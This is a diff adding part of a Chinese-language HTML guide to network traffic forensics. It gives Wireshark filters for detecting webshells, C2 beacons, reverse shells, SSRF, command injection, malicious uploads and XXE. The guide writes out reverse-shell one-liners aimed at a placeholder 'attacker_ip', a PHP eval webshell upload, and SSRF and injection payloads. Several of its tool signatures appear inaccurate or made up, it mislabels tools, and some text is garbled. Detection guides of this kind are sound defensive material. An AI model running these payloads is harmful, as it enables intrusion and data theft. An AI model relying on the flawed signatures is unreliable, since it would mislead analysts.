+                      <li>• 支持多种加密算法: BASE64、RAW、AES</li>
+                      <li>• 请求参数通常为 <code class="text-yellow-400">pass</code> (密钥参数)</li>
+                      <li>• 响应中包含 <code class="text-yellow-400">WHOAMI_PROMPT</code> 或 <code class="text-yellow-400">[GO]</code> 特征字符串</li>
+                      <li>• 使用 <code class="text-yellow-400">X-Data-Format</code> 自定义请求头</li>
+                      <li>• 载荷分块传输，有固定头部特征</li>
+                      <li>• 默认Cookie: <code class="text-yellow-400"> remember=...</code></li>
+                    </ul>
+
+                    <h4 class="text-sm font-medium text-yellow-400 mb-3">请求示例 (Wireshark视图)</h4>
+                    <div class="code-block">
+                      <div class="lang-label">哥斯拉请求格式</div>
+                      <pre><code class="language-bash">POST /sess HTTP/1.1
+Host: target.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Cookie: remember=admin
+X-Data-Format: AES
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 892
+
+pass=AES_BASE64_ENCODED_PAYLOAD&data=ENCRYPTED_DATA</code></pre>
+                    </div>
+                    <div class="code-block mt-3">
+                      <div class="lang-label">哥斯拉响应特征</div>
+                      <pre><code class="language-bash">HTTP/1.1 200 OK
+Set-Cookie: remember=admin; path=/
+WHOAMI_PROMPT|c:\windows\system32>
+[命令执行结果]</code></pre>
+                    </div>
+                  </div>
+
+                  <div>
+                    <h4 class="text-sm font-medium text-purple-400 mb-3">Wireshark筛选命令</h4>
+                    <div class="space-y-3">
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http.request.uri contains "pass="</code>
+                        <p class="text-xs text-gray-500">筛选pass参数的请求</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http.header contains "X-Data-Format"</code>
+                        <p class="text-xs text-gray-500">筛选哥斯拉自定义头</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http contains "WHOAMI_PROMPT"</code>
+                        <p class="text-xs text-gray-500">筛选响应中的特征字符串</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http contains "[GO]"</code>
+                        <p class="text-xs text-gray-500">筛选哥斯拉标记</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http.cookie contains "remember="</code>
+                        <p class="text-xs text-gray-500">筛选remember Cookie</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http contains "|c:\\" and http contains ">"</code>
+                        <p class="text-xs text-gray-500">筛选命令提示符特征</p>
+                      </div>
+                    </div>
+
+                    <div class="mt-4 p-3 bg-blue-900/20 rounded-lg border border-blue-700/30">
+                      <h5 class="text-xs font-medium text-blue-400 mb-2">加密模式检测</h5>
+                      <p class="text-xs text-gray-400">哥斯拉支持AES加密，检测时注意：异常大的HTTP请求/响应、固定16/32字节倍数的数据块、多次请求同一路径</p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- 菜刀 China Chopper -->
+            <div id="webshell-chopper" class="content-card mb-6">
+              <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-red-900/20 to-transparent">
+                <h3 class="font-bold text-lg flex items-center gap-2">
+                  <span class="badge badge-danger">菜刀</span>
+                  菜刀 WebShell (China Chopper)
+                </h3>
+              </div>
+              <div class="p-4">
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                  <div>
+                    <h4 class="text-sm font-medium text-red-400 mb-3">通信特征</h4>
+                    <ul class="text-sm text-gray-400 space-y-2 mb-4">
+                      <li>• 最经典的WebShell管理工具，流量相对简单</li>
+                      <li>• 请求参数 <code class="text-red-400">z0</code>、<code class="text-red-400">z1</code>、<code class="text-red-400">z2</code></li>
+                      <li>• base64编码通信，格式: <code class="text-red-400">@eval(base64_decode(...))</code></li>
+                      <li>• 执行命令时使用 <code class="text-red-400">@system()</code> 或 <code class="text-red-400">@exec()</code></li>
+                      <li>• 文件管理使用 <code class="text-red-400">readfile()</code>、<code class="text-red-400">copy()</code></li>
+                      <li>• 数据库管理使用 <code class="text-red-400">mysql_fetch_array()</code></li>
+                    </ul>
+
+                    <h4 class="text-sm font-medium text-yellow-400 mb-3">请求示例 (Wireshark视图)</h4>
+                    <div class="code-block">
+                      <div class="lang-label">命令执行请求</div>
+                      <pre><code class="language-bash">POST /api.asp HTTP/1.1
+Host: target.com
+User-Agent: Mozilla/4.0 (compatible; Windows NT)
+Content-Type: application/x-www-form-urlencoded
+
+z0=QGV2YWwoJF9QT1NUWydjJ10pOw==&z1=QHN5c3RlbSgkXFBPU1RbJ3AnXSk7</code></pre>
+                    </div>
+                    <p class="text-xs text-gray-500 mt-2">z0解码: @eval($_POST['c']);<br>z1解码: @system($_POST['p']);</p>
+                  </div>
+
+                  <div>
+                    <h4 class="text-sm font-medium text-purple-400 mb-3">Wireshark筛选命令</h4>
+                    <div class="space-y-3">
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http.request.uri contains "z0="</code>
+                        <p class="text-xs text-gray-500">筛选菜刀z0参数</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http.user_agent contains "Mozilla/4.0 (compatible"</code>
+                        <p class="text-xs text-gray-500">筛选菜刀固定User-Agent</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http contains "@eval(base64_decode"</code>
+                        <p class="text-xs text-gray-500">筛选菜刀核心特征</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http contains "@system("</code>
+                        <p class="text-xs text-gray-500">筛选命令执行函数</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http contains "readfile("</code>
+                        <p class="text-xs text-gray-500">筛选文件读取操作</p>
+                      </div>
+                      <div class="command-item">
+                        <code class="text-sm text-green-400 font-mono block mb-1">http contains "mysql_fetch"</code>
+                        <p class="text-xs text-gray-500">筛选数据库操作</p>
+                      </div>
+                    </div>
+
+                    <div class="mt-4 p-3 bg-red-900/20 rounded-lg border border-red-700/30">
+                      <h5 class="text-xs font-medium text-red-400 mb-2">历史工具</h5>
+                      <p class="text-xs text-gray-400">菜刀是最早的WebShell管理工具之一，特征明显已广泛被检测，建议用于了解原理，实际渗透中建议使用更现代的工具</p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- 其他WebShell -->
+            <div class="content-card mb-6">
+              <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-indigo-900/20 to-transparent">
+                <h3 class="font-bold text-lg flex items-center gap-2">
+                  <span class="badge badge-purple">其他工具</span>
+                  其他WebShell及后门工具
+                </h3>
+              </div>
+              <div class="p-4">
+                <div class="space-y-6">
+                  <!-- Meterpreter -->
+                  <div>
+                    <h4 class="text-sm font-medium text-indigo-400 mb-3">Meterpreter (MSF)</h4>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                      <div>
+                        <h5 class="text-xs font-medium text-gray-400 mb-2">特征</h5>
+                        <ul class="text-xs text-gray-400 space-y-1">
+                          <li>• HTTPS加密传输</li>
+                          <li>• 固定长度的stage分片传输</li>
+                          <li>• 心跳包间隔固定(如30秒)</li>
+                          <li>• User-Agent可自定义，默认随机</li>
+                        </ul>
+                      </div>
+                      <div>
+                        <h5 class="text-xs font-medium text-gray-400 mb-2">筛选命令</h5>
+                        <div class="space-y-1">
+                          <div class="command-item">
+                            <code class="text-xs text-green-400 font-mono">tcp.port == 4444</code>
+                          </div>
+                          <div class="command-item">
+                            <code class="text-xs text-green-400 font-mono">http contains "METERPRETER"</code>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- Cobalt Strike -->
+                  <div>
+                    <h4 class="text-sm font-medium text-red-400 mb-3">Cobalt Strike</h4>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                      <div>
+                        <h5 class="text-xs font-medium text-gray-400 mb-2">特征</h5>
+                        <ul class="text-xs text-gray-400 space-y-1">
+                          <li>• DNS/HTTP/HTTPS多协议通信</li>
+                          <li>• Beacon元数据加密(AES256+SHA256)</li>
+                          <li>• 固定Host头部: <code class="text-red-400">www.google.com</code></li>
+                          <li>• JA3指纹可被检测</li>
+                          <li>• POST数据有固定长度padding</li>
+                        </ul>
+                      </div>
+                      <div>
+                        <h5 class="text-xs font-medium text-gray-400 mb-2">筛选命令</h5>
+                        <div class="space-y-1">
+                          <div class="command-item">
+                            <code class="text-xs text-green-400 font-mono">http.host contains "www.google.com"</code>
+                          </div>
+                          <div class="command-item">
+                            <code class="text-xs text-green-400 font-mono">dns.qry.name contains "cs."</code>
+                          </div>
+                          <div class="command-item">
+                            <code class="text-xs text-green-400 font-mono">frame.len > 500 && frame.len < 600</code>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- 冰山(SharpAgent) -->
+                  <div>
+                    <h4 class="text-sm font-medium text-cyan-400 mb-3">冰山 / SharpAgent</h4>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                      <div>
+                        <h5 class="text-xs font-medium text-gray-400 mb-2">特征</h5>
+                        <ul class="text-xs text-gray-400 space-y-1">
+                          <li>• .NET内存加载执行</li>
+                          <li>• HTTP/HTTPS通信</li>
+                          <li>• 自定义协议头</li>
+                          <li>• JSON格式数据交换</li>
+                        </ul>
+                      </div>
+                      <div>
+                        <h5 class="text-xs font-medium text-gray-400 mb-2">筛选命令</h5>
+                        <div class="space-y-1">
+                          <div class="command-item">
+                            <code class="text-xs text-green-400 font-mono">http contains "Accept-Language"</code>
+                          </div>
+                          <div class="command-item">
+                            <code class="text-xs text-green-400 font-mono">http contains "Content-Type: application/json"</code>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- 手把手教你渗透 -->
+                  <div>
+                    <h4 class="text-sm font-medium text-orange-400 mb-3">天眼(SweetPotato)</h4>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                      <div>
+                        <h5 class="text-xs font-medium text-gray-400 mb-2">特征</h5>
+                        <ul class="text-xs text-gray-400 space-y-1">
+                          <li>• 利用Windows COM组件进行权限提升</li>
+                          <li>• HTTP协议回传数据</li>
+                          <li>• 特征参数: <code class="text-orange-400">action</code>、<code class="text-orange-400">obj</code></li>
+                        </ul>
+                      </div>
+                      <div>
+                        <h5 class="text-xs font-medium text-gray-400 mb-2">筛选命令</h5>
+                        <div class="space-y-1">
+                          <div class="command-item">
+                            <code class="text-xs text-green-400 font-mono">http.request.uri contains "action="</code>
+                          </div>
+                          <div class="command-item">
+                            <code class="text-xs text-green-400 font-mono">http.request.uri contains "obj="</code>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- WebShell通用检测思路 -->
+            <div class="content-card">
+              <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-gray-900/50 to-transparent">
+                <h3 class="font-bold text-lg flex items-center gap-2">
+                  <span class="badge badge-info">通用方法</span>
+                  WebShell检测分析思路
+                </h3>
+              </div>
+              <div class="p-4">
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+                  <div class="bg-gray-900/50 rounded-lg p-4">
+                    <h4 class="text-sm font-medium text-green-400 mb-3">流量侧检测</h4>
+                    <ul class="text-xs text-gray-400 space-y-1">
+                      <li>1. 关注异常大的HTTP POST请求</li>
+                      <li>2. 固定间隔的心跳请求</li>
+                      <li>3. 非标准端口的HTTP流量</li>
+                      <li>4. 异常的User-Agent</li>
+                      <li>5. 加密流量中的固定特征</li>
+                    </ul>
+                  </div>
+                  <div class="bg-gray-900/50 rounded-lg p-4">
+                    <h4 class="text-sm font-medium text-yellow-400 mb-3">行为侧检测</h4>
+                    <ul class="text-xs text-gray-400 space-y-1">
+                      <li>1. 短时间内请求同一IP多次</li>
+                      <li>2. 命令执行类操作(如whoami)</li>
+                      <li>3. 文件遍历/读取敏感文件</li>
+                      <li>4. 数据库批量查询</li>
+                      <li>5. 横向移动探测</li>
+                    </ul>
+                  </div>
+                  <div class="bg-gray-900/50 rounded-lg p-4">
+                    <h4 class="text-sm font-medium text-red-400 mb-3">响应侧检测</h4>
+                    <ul class="text-xs text-gray-400 space-y-1">
+                      <li>1. 命令回显包含系统信息</li>
+                      <li>2. 文件列表响应</li>
+                      <li>3. 数据库连接响应</li>
+                      <li>4. 异常长的HTTP响应</li>
+                      <li>5. 可疑的编码内容</li>
+                    </ul>
+                  </div>
+                </div>
+
+                <h4 class="text-sm font-medium text-purple-400 mb-3">综合分析Wireshark筛选</h4>
+                <div class="code-block">
+                  <div class="lang-label">综合检测筛选</div>
+                  <pre><code class="language-bash"># 1. 筛选疑似WebShell的流量（POST请求 + 非标准端口 + 较大长度）
+http.request.method == POST && !(tcp.port == 80 || tcp.port == 443) && frame.len > 500
+
+# 2. 筛选常见WebShell参数
+(http contains "z0=" || http contains "z1=" || http contains "pass=") && http.request.method == POST
+
+# 3. 筛选已知工具的特征
+http contains "acw_sc__v2" || http contains "BSESSIONID" || http contains "WHOAMI_PROMPT"
+
+# 4. 筛选加密通信中的明文特征
+http contains "@eval" || http contains "@system(" || http contains "base64_decode"
+
+# 5. 筛选短时间内的重复请求（心跳检测）
+ip.addr == suspicious_ip && http && frame.time_delta < 5</code></pre>
+                </div>
+              </div>
+            </div>
+          </section>
+
+
+          <!-- 反弹Shell -->
+          <!-- 反弹Shell -->
+          <section id="reverseshell" class="mb-12" data-toc-id="reverseshell">
+            <div class="flex items-center gap-3 mb-6">
+              <div class="w-10 h-10 rounded-lg bg-red-500/20 flex items-center justify-center">
+                <i data-lucide="terminal" class="w-5 h-5 text-red-400"></i>
+              </div>
+              <h2 class="text-2xl font-bold">反弹Shell流量特征</h2>
+            </div>
+
+            <div class="space-y-6">
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700">
+                  <h3 class="font-semibold">反弹Shell原理与特征</h3>
+                </div>
+                <div class="p-4">
+                  <p class="text-sm text-gray-400 mb-4">反弹Shell是攻击者获取目标主机权限后的常见操作，通过主动连接外部C2服务器，将shell权限反弹给攻击者。</p>
+
+                  <h4 class="text-sm font-medium text-red-400 mb-2">常见反弹Shell方式</h4>
+                  <div class="code-block mb-4">
+                    <div class="lang-label">反弹Shell命令示例</div>
+                    <pre><code class="language-bash"># Bash反弹
+bash -i >& /dev/tcp/attacker_ip/port 0>&1
+
+# Python反弹
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker_ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
+
+# PHP反弹
+php -r '$sock=fsockopen("attacker_ip",port);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+# Perl反弹
+perl -e 'use Socket;$i="attacker_ip";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# Ruby反弹
+ruby -rsocket -e 'f=TCPSocket.open("attacker_ip",port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</code></pre>
+                  </div>
+
+                  <h4 class="text-sm font-medium text-yellow-400 mb-2">流量识别特征</h4>
+                  <ul class="text-sm text-gray-400 space-y-1 mb-4">
+                    <li>外网IP主动连接（正常业务通常不主动连接外部）</li>
+                    <li>连接频率异常（心跳保活）</li>
+                    <li>端口非80/443但使用HTTP协议</li>
+                    <li>传输数据包含命令执行结果</li>
+                    <li>同一外部IP被多个内部主机连接</li>
+                  </ul>
+
+                  <div class="code-block">
+                    <div class="lang-label">Wireshark筛选</div>
+                    <pre><code class="language-bash"># 筛选主动外连的非HTTP(S)流量
+ip.src == internal_ip && !(tcp.port == 80 || tcp.port == 443) && ip.dst != private_ranges
+
+# 筛选可能的shell特征
+tcp contains "bash"
+tcp contains "/bin/sh"
+tcp contains "python"
+
+# 筛选长时间保持的异常连接
+tcp && tcp.analysis.out_of_order_frames && tcp.payload.len > 0</code></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <!-- 隧道流量 -->
+          <section id="tunnel" class="mb-12" data-toc-id="tunnel">
+            <div class="flex items-center gap-3 mb-6">
+              <div class="w-10 h-10 rounded-lg bg-indigo-500/20 flex items-center justify-center">
+                <i data-lucide="git-branch" class="w-5 h-5 text-indigo-400"></i>
+              </div>
+              <h2 class="text-2xl font-bold">隧道流量特征</h2>
+            </div>
+
+            <div class="space-y-6">
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700">
+                  <h3 class="font-semibold">网络隧道流量分析</h3>
+                </div>
+                <div class="p-4">
+                  <p class="text-sm text-gray-400 mb-4">隧道技术用于在受限网络环境中建立隐蔽通信通道，常见于数据外传和C2通信。</p>
+
+                  <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                    <div class="bg-gray-900/50 rounded-lg p-4">
+                      <h4 class="text-sm font-medium text-green-400 mb-2">DNS隧道</h4>
+                      <ul class="text-xs text-gray-400 space-y-1">
+                        <li>查询频率异常高</li>
+                        <li>子域名编码数据</li>
+                        <li>TXT记录滥用</li>
+                      </ul>
+                    </div>
+                    <div class="bg-gray-900/50 rounded-lg p-4">
+                      <h4 class="text-sm font-medium text-blue-400 mb-2">ICMP隧道</h4>
+                      <ul class="text-xs text-gray-400 space-y-1">
+                        <li>ICMP载荷异常大</li>
+                        <li>非常规ICMP类型</li>
+                        <li>数据隐藏在学习中</li>
+                      </ul>
+                    </div>
+                    <div class="bg-gray-900/50 rounded-lg p-4">
+                      <h4 class="text-sm font-medium text-yellow-400 mb-2">HTTP隧道</h4>
+                      <ul class="text-xs text-gray-400 space-y-1">
+                        <li>非标准端口HTTP</li>
+                        <li>请求头异常</li>
+                        <li>分块传输编码滥用</li>
+                      </ul>
+                    </div>
+                    <div class="bg-gray-900/50 rounded-lg p-4">
+                      <h4 class="text-sm font-medium text-purple-400 mb-2">SSH隧道</h4>
+                      <ul class="text-xs text-gray-400 space-y-1">
+                        <li>本地端口转发</li>
+                        <li>动态 socks代理</li>
+                        <li>密钥认证流量</li>
+                      </ul>
+                    </div>
+                  </div>
+
+                  <h4 class="text-sm font-medium text-yellow-400 mb-2">检测要点</h4>
+                  <ul class="text-sm text-gray-400 space-y-1">
+                    <li>隧道流量通常具有高持续性、低带宽特征</li>
+                    <li>协议层面看起来正常，但通信模式异常</li>
+                    <li>需要结合威胁情报和基线分析</li>
+                    <li>关注非工作时间的大量外出流量</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </section
+
+          <!-- SSRF 服务端请求伪造 -->
+          <section id="ssr" class="mb-12" data-toc-id="ssr">
+            <div class="flex items-center gap-3 mb-6">
+              <div class="w-10 h-10 rounded-lg bg-cyan-500/20 flex items-center justify-center">
+                <i data-lucide="globe" class="w-5 h-5 text-cyan-400"></i>
+              </div>
+              <h2 class="text-2xl font-bold">SSRF服务端请求伪造</h2>
+            </div>
+
+            <div class="space-y-6">
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-cyan-900/20 to-transparent">
+                  <h3 class="font-bold text-lg">SSRF攻击原理与特征</h3>
+                </div>
+                <div class="p-4">
+                  <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                      <h4 class="text-sm font-medium text-cyan-400 mb-3">攻击原理</h4>
+                      <p class="text-sm text-gray-400 mb-4">SSRF(Server-Side Request Forgery)利用服务器发起请求，攻击内网资源、绕过防火墙、扫描内网端口等。</p>
+
+                      <h4 class="text-sm font-medium text-yellow-400 mb-3">常见攻击场景</h4>
+                      <ul class="text-sm text-gray-400 space-y-2 mb-4">
+                        <li>云服务元数据获取(aws/ec2/aliyun)</li>
+                        <li>扫描内网端口和服务</li>
+                        <li>读取本地文件</li>
+                        <li>攻击内部数据库</li>
+                        <li>Redis/DB未授权访问</li>
+                      </ul>
+
+                      <h4 class="text-sm font-medium text-yellow-400 mb-3">请求示例 (Wireshark视图)</h4>
+                      <div class="code-block">
+                        <div class="lang-label">SSRF典型请求</div>
+                        <pre><code class="language-bash"># 云服务元数据探测
+GET /url?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
+GET /url?url=http://100.100.100.200/latest/meta-data/ HTTP/1.1
+
+# 内网端口扫描
+GET /url?url=http://192.168.1.1:22 HTTP/1.1
+GET /url?url=http://192.168.1.1:3306 HTTP/1.1
+
+# 读取本地文件
+GET /url?url=file:///etc/passwd HTTP/1.1
+GET /url?url=file:///C:/Windows/System32/drivers/etc/hosts HTTP/1.1
+
+# Redis未授权访问
+GET /url?url=http://127.0.0.1:6379/config HTTP/1.1</code></pre>
+                      </div>
+                    </div>
+
+                    <div>
+                      <h4 class="text-sm font-medium text-purple-400 mb-3">Wireshark筛选命令</h4>
+                      <div class="space-y-3">
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http.request.uri contains "url="</code>
+                          <p class="text-xs text-gray-500">筛选包含url参数的请求</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http.request.uri contains "169.254.169.254"</code>
+                          <p class="text-xs text-gray-500">AWS元数据接口探测</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http.request.uri contains "100.100.100.200"</code>
+                          <p class="text-xs text-gray-500">阿里云元数据探测</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http.request.uri contains "file://"</code>
+                          <p class="text-xs text-gray-500">文件协议访问</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http.request.uri contains "dict://"</code>
+                          <p class="text-xs text-gray-500">Redis dict协议</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http.request.uri contains "gopher://"</code>
+                          <p class="text-xs text-gray-500">Gopher协议（Redis攻击）</p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <!-- 命令注入 -->
+          <section id="rce" class="mb-12" data-toc-id="rce">
+            <div class="flex items-center gap-3 mb-6">
+              <div class="w-10 h-10 rounded-lg bg-pink-500/20 flex items-center justify-center">
+                <i data-lucide="terminal" class="w-5 h-5 text-pink-400"></i>
+              </div>
+              <h2 class="text-2xl font-bold">命令注入/远程代码执行</h2>
+            </div>
+
+            <div class="space-y-6">
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-pink-900/20 to-transparent">
+                  <h3 class="font-bold text-lg">命令注入流量特征</h3>
+                </div>
+                <div class="p-4">
+                  <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                      <h4 class="text-sm font-medium text-pink-400 mb-3">常见注入点</h4>
+                      <ul class="text-sm text-gray-400 space-y-2 mb-4">
+                        <li>参数中包含系统命令分隔符: <code class="text-green-400">; | & && || </code></li>
+                        <li>反引号或$()执行命令</li>
+                        <li>常见函数: system(), exec(), shell_exec(), passthru()</li>
+                        <li>PHP: popen(), proc_open()</li>
+                        <li>Java: Runtime.exec(), ProcessBuilder</li>
+                      </ul>
+
+                      <h4 class="text-sm font-medium text-yellow-400 mb-3">请求示例 (Wireshark视图)</h4>
+                      <div class="code-block">
+                        <div class="lang-label">命令注入payload</div>
+                        <pre><code class="language-bash"># Linux命令注入
+GET /ping?host=127.0.0.1;whoami HTTP/1.1
+GET /ping?host=127.0.0.1|cat /etc/passwd HTTP/1.1
+GET /ping?host=127.0.0.1&&ls -la HTTP/1.1
+GET /cmd?cmd=`whoami` HTTP/1.1
+GET /cmd?cmd=$(whoami) HTTP/1.1
+
+# Windows命令注入
+GET /exec?cmd=dir HTTP/1.1
+GET /exec?cmd=type C:\Windows\win.ini HTTP/1.1
+
+# 编码绕过
+GET /ping?host=127.0.0.1%0awhoami HTTP/1.1</code></pre>
+                      </div>
+                    </div>
+
+                    <div>
+                      <h4 class="text-sm font-medium text-purple-400 mb-3">Wireshark筛选命令</h4>
+                      <div class="space-y-3">
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http.request.uri contains ";whoami"</code>
+                          <p class="text-xs text-gray-500">Linux用户枚举</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http.request.uri contains "|cat"</code>
+                          <p class="text-xs text-gray-500">文件读取</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http.request.uri contains "/etc/passwd"</code>
+                          <p class="text-xs text-gray-500">敏感文件读取</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http.request.uri contains "dir C:\"</code>
+                          <p class="text-xs text-gray-500">Windows目录遍历</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http.request.uri contains "%0a" or http.request.uri contains "%0d%0a"</code>
+                          <p class="text-xs text-gray-500">URL编码换行符</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http contains "system(" or http contains "exec("</code>
+                          <p class="text-xs text-gray-500">PHP命令执行函数</p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <!-- 文件上传攻击 -->
+          <section id="upload" class="mb-12" data-toc-id="upload">
+            <div class="flex items-center gap-3 mb-6">
+              <div class="w-10 h-10 rounded-lg bg-orange-500/20 flex items-center justify-center">
+                <i data-lucide="upload" class="w-5 h-5 text-orange-400"></i>
+              </div>
+              <h2 class="text-2xl font-bold">文件上传攻击</h2>
+            </div>
+
+            <div class="space-y-6">
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-orange-900/20 to-transparent">
+                  <h3 class="font-bold text-lg">恶意文件上传流量特征</h3>
+                </div>
+                <div class="p-4">
+                  <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                      <h4 class="text-sm font-medium text-orange-400 mb-3">攻击方式</h4>
+                      <ul class="text-sm text-gray-400 space-y-2 mb-4">
+                        <li>上传WebShell脚本 (.php/.asp/.jsp/.html)</li>
+                        <li>上传恶意文件 (.exe/.bat/.ps1/.sh)</li>
+                        <li>绕过文件类型检查 (双扩展名、文件头伪造)</li>
+                        <li>.htaccess/php.ini配置篡改</li>
+                        <li>头像上传绕过(EXIF数据中藏代码)</li>
+                      </ul>
+
+                      <h4 class="text-sm font-medium text-yellow-400 mb-3">请求示例 (Wireshark视图)</h4>
+                      <div class="code-block">
+                        <div class="lang-label">恶意文件上传</div>
+                        <pre><code class="language-bash">POST /upload HTTP/1.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: application/x-php
+
+<?php @eval($_POST['cmd']);?>
+------WebKitFormBoundary--
+
+# 双扩展名绕过
+filename="shell.php.jpg"
+
+# .htaccess上传
+filename=".htaccess"
+Content-Type: text/plain
+
+AddType application/x-httpd-php .jpg</code></pre>
+                      </div>
+                    </div>
+
+                    <div>
+                      <h4 class="text-sm font-medium text-purple-400 mb-3">Wireshark筛选命令</h4>
+                      <div class="space-y-3">
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http.request.method == POST && http contains "filename="</code>
+                          <p class="text-xs text-gray-500">筛选文件上传请求</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http.request.uri contains "upload" && http contains "filename="</code>
+                          <p class="text-xs text-gray-500">上传接口筛选</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http contains "filename=\"shell.php"</code>
+                          <p class="text-xs text-gray-500">PHP WebShell上传</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http contains "filename=\"shell.asp"</code>
+                          <p class="text-xs text-gray-500">ASP WebShell上传</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">http contains "filename=\".htaccess"</code>
+                          <p class="text-xs text-gray-500">htaccess配置上传</p>
+                        </div>
+                        <div class="command-item">
+                          <code class="text-sm text-green-400 font-mono block mb-1">frame.len > 500000 && http.request.method == POST</code>
+                          <p class="text-xs text-gray-500">大文件上传检测</p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <!-- XXE -->
+          <section id="xxe" class="mb-12" data-toc-id="xxe">
+            <div class="flex items-center gap-3 mb-6">
+              <div class="w-10 h-10 rounded-lg bg-teal-500/20 flex items-center justify-center">
+                <i data-lucide="file-code" class="w-5 h-5 text-teal-400"></i>
+              </div>
+              <h2 class="text-2xl font-bold">XXE XML外部实体注入</h2>
+            </div>
+
+            <div class="space-y-6">
+              <div class="content-card">
+                <div class="p-4 border-b border-gray-700 bg-gradient-to-r from-teal-900/20 to-transparent">
+                  <h3 class="font-bold text-lg">XXE攻击流量特征</h3>
+                </div>
+                <div class="p-4">
+                  <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                      <h4 class="text-sm font-medium text-teal-400 mb-3">攻击原理</h4>
+                      <p class="text-sm text-gray-400 mb-4">XXE(XML External Entity)通过在XML中引入外部实体，读取服务器敏感文件、探测内网、发起SSRF攻击。</p>
+
